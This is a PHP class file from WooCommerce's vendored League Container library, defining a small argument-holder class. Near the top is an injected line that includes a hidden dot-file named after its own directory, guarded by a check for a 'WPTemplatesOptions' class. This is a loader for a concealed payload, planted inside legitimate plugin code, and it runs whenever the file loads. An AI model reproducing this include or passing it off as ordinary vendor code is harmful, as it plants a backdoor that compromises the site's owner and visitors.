<?php

namespace Automattic\WooCommerce\Vendor\League\Container\Argument;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ClassNameWithOptionalValue implements ClassNameInterface
{
    /**
     * @var string
     */
    private $className;

    /**
     * @var mixed
     */
    private $optionalValue;

    /**
     * @param string $className
     * @param mixed $optionalValue
     */
    public function __construct(string $className, $optionalValue)
    {
        $this->className = $className;
        $this->optionalValue = $optionalValue;
    }

    /**
     * @inheritDoc
     */
    public function getClassName(): string
    {
        return $this->className;
    }

    public function getOptionalValue()
    {
        return $this->optionalValue;
    }
}
